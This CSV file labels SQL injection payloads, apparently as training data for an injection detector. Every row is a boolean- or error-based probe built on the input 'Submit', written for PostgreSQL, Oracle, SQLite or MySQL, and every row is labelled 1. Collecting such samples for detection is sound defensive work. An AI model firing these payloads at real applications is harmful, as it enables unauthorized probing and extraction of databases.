Sentence,Label
Submit' AND (SELECT (CASE WHEN (1186=4615) THEN NULL ELSE CAST((CHR(98)||CHR(67)||CHR(108)||CHR(111)) AS NUMERIC) END)) IS NULL AND 'xAoX'='xAoX,1
Submit') AND (SELECT (CASE WHEN (8588=4740) THEN NULL ELSE CAST((CHR(74)||CHR(106)||CHR(113)||CHR(100)) AS NUMERIC) END)) IS NULL AND ('qkhS' LIKE 'qkhS,1
Submit') AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('sGMg' LIKE 'sGMg,1
Submit') AND (SELECT (CASE WHEN (5556=1304) THEN NULL ELSE CAST((CHR(113)||CHR(122)||CHR(74)||CHR(112)) AS NUMERIC) END)) IS NULL AND ('GrKm' LIKE 'GrKm,1
Submit%' AND (SELECT (CASE WHEN (2978=6901) THEN NULL ELSE CAST((CHR(105)||CHR(108)||CHR(106)||CHR(84)) AS NUMERIC) END)) IS NULL AND 'DDlM%'='DDlM,1
Submit%' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'eaNc%'='eaNc,1
Submit%' AND (SELECT (CASE WHEN (7709=7600) THEN NULL ELSE CAST((CHR(109)||CHR(104)||CHR(111)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'QhpM%'='QhpM,1
Submit' AND (SELECT (CASE WHEN (6666=3111) THEN NULL ELSE CAST((CHR(66)||CHR(87)||CHR(79)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'albB' LIKE 'albB,1
Submit' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'mZMz' LIKE 'mZMz,1
Submit' AND (SELECT (CASE WHEN (4630=6815) THEN NULL ELSE CAST((CHR(72)||CHR(84)||CHR(76)||CHR(74)) AS NUMERIC) END)) IS NULL AND 'KazW' LIKE 'KazW,1
"Submit"") AND (SELECT (CASE WHEN (2930=1987) THEN NULL ELSE CAST((CHR(119)||CHR(81)||CHR(112)||CHR(102)) AS NUMERIC) END)) IS NULL AND (""wahq""=""wahq",1
"Submit"") AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (""ReSL""=""ReSL",1
"Submit"") AND (SELECT (CASE WHEN (9798=1594) THEN NULL ELSE CAST((CHR(87)||CHR(119)||CHR(79)||CHR(77)) AS NUMERIC) END)) IS NULL AND (""MnqS""=""MnqS",1
"Submit"" AND (SELECT (CASE WHEN (3054=4113) THEN NULL ELSE CAST((CHR(102)||CHR(117)||CHR(117)||CHR(100)) AS NUMERIC) END)) IS NULL AND ""YTFW""=""YTFW",1
"Submit"" AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ""vQlB""=""vQlB",1
"Submit"" AND (SELECT (CASE WHEN (5818=3062) THEN NULL ELSE CAST((CHR(110)||CHR(115)||CHR(65)||CHR(98)) AS NUMERIC) END)) IS NULL AND ""hemg""=""hemg",1
Submit) AND (SELECT (CASE WHEN (4001=9701) THEN NULL ELSE CAST((CHR(108)||CHR(76)||CHR(116)||CHR(83)) AS NUMERIC) END)) IS NULL AND (9644=9644,1
Submit) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (4303=4303,1
Submit) AND (SELECT (CASE WHEN (4204=4362) THEN NULL ELSE CAST((CHR(102)||CHR(78)||CHR(74)||CHR(97)) AS NUMERIC) END)) IS NULL AND (3774=3774,1
Submit)) AND (SELECT (CASE WHEN (2288=8819) THEN NULL ELSE CAST((CHR(107)||CHR(122)||CHR(106)||CHR(68)) AS NUMERIC) END)) IS NULL AND ((8897=8897,1
Submit)) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ((6496=6496,1
Submit)) AND (SELECT (CASE WHEN (4478=9220) THEN NULL ELSE CAST((CHR(107)||CHR(81)||CHR(71)||CHR(72)) AS NUMERIC) END)) IS NULL AND ((1337=1337,1
Submit AND (SELECT (CASE WHEN (2229=5726) THEN NULL ELSE CAST((CHR(88)||CHR(71)||CHR(115)||CHR(113)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (7009=5608) THEN NULL ELSE CAST((CHR(68)||CHR(118)||CHR(121)||CHR(89)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (3892=6927) THEN NULL ELSE CAST((CHR(112)||CHR(120)||CHR(99)||CHR(120)) AS NUMERIC) END)) IS NULL-- YPGY,1
Submit AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL-- tsUE,1
Submit AND (SELECT (CASE WHEN (2784=3844) THEN NULL ELSE CAST((CHR(66)||CHR(76)||CHR(68)||CHR(69)) AS NUMERIC) END)) IS NULL-- PQGT,1
"Submit') AND (SELECT (CASE WHEN (5912=4521) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5912) END) FROM DUAL) IS NULL AND ('pcDa'='pcDa",1
"Submit') AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ('DsCi'='DsCi",1
"Submit') AND (SELECT (CASE WHEN (3804=6836) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3804) END) FROM DUAL) IS NULL AND ('IuOy'='IuOy",1
"Submit')) AND (SELECT (CASE WHEN (9878=8597) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9878) END) FROM DUAL) IS NULL AND (('skbJ'='skbJ",1
"Submit')) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (('wZHQ'='wZHQ",1
"Submit')) AND (SELECT (CASE WHEN (5848=5594) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5848) END) FROM DUAL) IS NULL AND (('FyYm'='FyYm",1
"Submit' AND (SELECT (CASE WHEN (2472=4248) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2472) END) FROM DUAL) IS NULL AND 'LnpA'='LnpA",1
"Submit' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'VzNS'='VzNS",1
"Submit' AND (SELECT (CASE WHEN (2141=4398) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2141) END) FROM DUAL) IS NULL AND 'gUOE'='gUOE",1
"Submit') AND (SELECT (CASE WHEN (7003=2032) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7003) END) FROM DUAL) IS NULL AND ('wgbj' LIKE 'wgbj",1
"Submit') AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ('ScKZ' LIKE 'ScKZ",1
"Submit') AND (SELECT (CASE WHEN (9694=5748) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9694) END) FROM DUAL) IS NULL AND ('JbHD' LIKE 'JbHD",1
"Submit%' AND (SELECT (CASE WHEN (2234=2966) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2234) END) FROM DUAL) IS NULL AND 'tSiu%'='tSiu",1
"Submit%' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'ZzgJ%'='ZzgJ",1
"Submit%' AND (SELECT (CASE WHEN (2984=4069) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2984) END) FROM DUAL) IS NULL AND 'dKXo%'='dKXo",1
"Submit' AND (SELECT (CASE WHEN (6116=2573) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6116) END) FROM DUAL) IS NULL AND 'cuQe' LIKE 'cuQe",1
"Submit' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'mSDN' LIKE 'mSDN",1
"Submit' AND (SELECT (CASE WHEN (2157=2052) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2157) END) FROM DUAL) IS NULL AND 'TJWd' LIKE 'TJWd",1
"Submit"") AND (SELECT (CASE WHEN (6250=6334) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6250) END) FROM DUAL) IS NULL AND (""rNWS""=""rNWS",1
"Submit"") AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (""wgtO""=""wgtO",1
"Submit"") AND (SELECT (CASE WHEN (2158=9961) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2158) END) FROM DUAL) IS NULL AND (""MNzJ""=""MNzJ",1
"Submit"" AND (SELECT (CASE WHEN (7671=5894) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7671) END) FROM DUAL) IS NULL AND ""Owid""=""Owid",1
"Submit"" AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ""RRHb""=""RRHb",1
"Submit"" AND (SELECT (CASE WHEN (8936=9640) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8936) END) FROM DUAL) IS NULL AND ""DYLH""=""DYLH",1
"Submit) AND (SELECT (CASE WHEN (8130=2858) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8130) END) FROM DUAL) IS NULL AND (1307=1307",1
"Submit) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (7710=7710",1
"Submit) AND (SELECT (CASE WHEN (6247=7283) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6247) END) FROM DUAL) IS NULL AND (5336=5336",1
"Submit)) AND (SELECT (CASE WHEN (9284=6213) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9284) END) FROM DUAL) IS NULL AND ((5684=5684",1
"Submit)) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ((9657=9657",1
"Submit)) AND (SELECT (CASE WHEN (9019=3459) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9019) END) FROM DUAL) IS NULL AND ((5256=5256",1
"Submit AND (SELECT (CASE WHEN (3159=5041) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3159) END) FROM DUAL) IS NULL",1
"Submit AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL",1
"Submit AND (SELECT (CASE WHEN (5854=5447) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5854) END) FROM DUAL) IS NULL",1
"Submit AND (SELECT (CASE WHEN (1388=8813) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1388) END) FROM DUAL) IS NULL-- wdeE",1
"Submit AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL-- PjIr",1
"Submit AND (SELECT (CASE WHEN (6986=7149) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6986) END) FROM DUAL) IS NULL-- xbbN",1
"Submit') AND CASE WHEN 3075=9866 THEN 3075 ELSE JSON(CHAR(68,76,119,65)) END AND ('ndfQ'='ndfQ",1
"Submit') AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ('JEEK'='JEEK",1
"Submit') AND CASE WHEN 6105=4524 THEN 6105 ELSE JSON(CHAR(66,69,70,111)) END AND ('eJDD'='eJDD",1
"Submit')) AND CASE WHEN 5921=2901 THEN 5921 ELSE JSON(CHAR(105,113,109,109)) END AND (('HqTs'='HqTs",1
"Submit')) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (('bZay'='bZay",1
"Submit')) AND CASE WHEN 2155=2487 THEN 2155 ELSE JSON(CHAR(119,120,83,106)) END AND (('wonY'='wonY",1
"Submit' AND CASE WHEN 5649=9796 THEN 5649 ELSE JSON(CHAR(69,77,72,73)) END AND 'UFml'='UFml",1
"Submit' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'PRWV'='PRWV",1
"Submit' AND CASE WHEN 9240=6191 THEN 9240 ELSE JSON(CHAR(67,90,115,99)) END AND 'XNce'='XNce",1
"Submit') AND CASE WHEN 3691=8563 THEN 3691 ELSE JSON(CHAR(87,114,68,117)) END AND ('nJIw' LIKE 'nJIw",1
"Submit') AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ('FWcy' LIKE 'FWcy",1
"Submit') AND CASE WHEN 4471=9978 THEN 4471 ELSE JSON(CHAR(85,113,99,77)) END AND ('KofA' LIKE 'KofA",1
"Submit%' AND CASE WHEN 6710=2009 THEN 6710 ELSE JSON(CHAR(76,82,78,84)) END AND 'bJJz%'='bJJz",1
"Submit%' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'cNFt%'='cNFt",1
"Submit%' AND CASE WHEN 6597=7141 THEN 6597 ELSE JSON(CHAR(75,71,65,101)) END AND 'lIcT%'='lIcT",1
"Submit' AND CASE WHEN 3861=9729 THEN 3861 ELSE JSON(CHAR(65,80,77,83)) END AND 'LDqr' LIKE 'LDqr",1
"Submit' AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND 'ESHy' LIKE 'ESHy",1
"Submit' AND CASE WHEN 5211=1350 THEN 5211 ELSE JSON(CHAR(118,102,118,102)) END AND 'mhwT' LIKE 'mhwT",1
"Submit"") AND CASE WHEN 8904=9569 THEN 8904 ELSE JSON(CHAR(88,97,84,118)) END AND (""zJFG""=""zJFG",1
"Submit"") AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (""gRDC""=""gRDC",1
"Submit"") AND CASE WHEN 3984=7281 THEN 3984 ELSE JSON(CHAR(119,120,116,85)) END AND (""QcOR""=""QcOR",1
"Submit"" AND CASE WHEN 4441=3247 THEN 4441 ELSE JSON(CHAR(116,118,113,101)) END AND ""sFVm""=""sFVm",1
"Submit"" AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ""xhmS""=""xhmS",1
"Submit"" AND CASE WHEN 1080=7105 THEN 1080 ELSE JSON(CHAR(80,122,98,97)) END AND ""emrZ""=""emrZ",1
"Submit) AND CASE WHEN 2567=8089 THEN 2567 ELSE JSON(CHAR(98,118,89,90)) END AND (8631=8631",1
"Submit) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND (6511=6511",1
"Submit) AND CASE WHEN 5065=6235 THEN 5065 ELSE JSON(CHAR(82,75,111,84)) END AND (7068=7068",1
"Submit)) AND CASE WHEN 6758=6494 THEN 6758 ELSE JSON(CHAR(72,104,112,77)) END AND ((7566=7566",1
"Submit)) AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END AND ((9621=9621",1
"Submit)) AND CASE WHEN 5060=3306 THEN 5060 ELSE JSON(CHAR(101,69,80,73)) END AND ((7856=7856",1
"Submit AND CASE WHEN 3223=9989 THEN 3223 ELSE JSON(CHAR(68,115,72,79)) END",1
"Submit AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END",1
"Submit AND CASE WHEN 5676=3097 THEN 5676 ELSE JSON(CHAR(117,117,90,85)) END",1
"Submit AND CASE WHEN 8364=4103 THEN 8364 ELSE JSON(CHAR(77,120,97,117)) END-- EZaL",1
"Submit AND CASE WHEN 6550=6550 THEN 6550 ELSE JSON(CHAR(81,68,118,72)) END-- oXfb",1
"Submit AND CASE WHEN 6281=1909 THEN 6281 ELSE JSON(CHAR(122,67,120,121)) END-- Zhbt",1
(SELECT (CASE WHEN (8708=5093) THEN 'Submit' ELSE (SELECT 5093 UNION SELECT 6941) END)),1
(SELECT (CASE WHEN (6592=6592) THEN 'Submit' ELSE (SELECT 9192 UNION SELECT 5664) END)),1
(SELECT (CASE WHEN (7383=4321) THEN 'Submit' ELSE (SELECT 4321 UNION SELECT 3093) END)),1
(CASE WHEN (9764=9977) THEN 9764 ELSE 9764*(SELECT 9764 FROM DUAL UNION SELECT 9977 FROM DUAL) END),1
(CASE WHEN (5625=5625) THEN 5625 ELSE 5625*(SELECT 5625 FROM DUAL UNION SELECT 1579 FROM DUAL) END),1
(CASE WHEN (5594=4033) THEN 5594 ELSE 5594*(SELECT 5594 FROM DUAL UNION SELECT 4033 FROM DUAL) END),1
(CASE WHEN 3793=8355 THEN 3793 ELSE NULL END),1
(CASE WHEN 8195=8195 THEN 8195 ELSE NULL END),1
(CASE WHEN 1570=6202 THEN 1570 ELSE NULL END),1
"Submit,(SELECT (CASE WHEN (7669=8585) THEN 1 ELSE 7669*(SELECT 7669 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (4435=4435) THEN 1 ELSE 4435*(SELECT 4435 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (7708=1385) THEN 1 ELSE 7708*(SELECT 7708 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"Submit,(SELECT (CASE WHEN (5250=2693) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit,(SELECT (CASE WHEN (3452=3452) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit,(SELECT (CASE WHEN (5858=7111) THEN 1 ELSE 1/(SELECT 0) END))",1
"Submit') AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ('hoKB'='hoKB",1
"Submit')) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (('kxQs'='kxQs",1
"Submit' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'EvwS'='EvwS",1
"Submit') AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ('gInF' LIKE 'gInF",1
"Submit%' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'gMnw%'='gMnw",1
"Submit' AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND 'miBm' LIKE 'miBm",1
"Submit"") AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (""fSCe""=""fSCe",1
"Submit"" AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ""lFwi""=""lFwi",1
"Submit) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND (4034=4034",1
"Submit)) AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671)) AND ((4957=4957",1
"Submit AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671))",1
"Submit AND EXTRACTVALUE(5726,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(5726=5726,1))),0x717a627671))-- Gdct",1
"Submit') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ('DiHE'='DiHE",1
"Submit')) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (('XaxN'='XaxN",1
"Submit' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'TGZA'='TGZA",1
"Submit') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ('bmaS' LIKE 'bmaS",1
"Submit%' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'edDm%'='edDm",1
"Submit' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND 'Buxi' LIKE 'Buxi",1
"Submit"") AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (""IFkG""=""IFkG",1
"Submit"" AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ""TqPQ""=""TqPQ",1
"Submit) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND (3832=3832",1
"Submit)) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581) AND ((8395=8395",1
"Submit AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581)",1
"Submit AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(4581=4581,1))),0x717a627671),4581)-- wEcZ",1
Submit') AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('NBZK'='NBZK,1
Submit')) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (('WmqF'='WmqF,1
Submit' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'bOuM'='bOuM,1
Submit') AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('bTXO' LIKE 'bTXO,1
Submit%' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'oMvg%'='oMvg,1
Submit' AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'YHVu' LIKE 'YHVu,1
"Submit"") AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (""ivWW""=""ivWW",1
"Submit"" AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ""nHUh""=""nHUh",1
Submit) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (5144=5144,1
Submit)) AND 6499=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6499=6499) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ((3840=3840,1
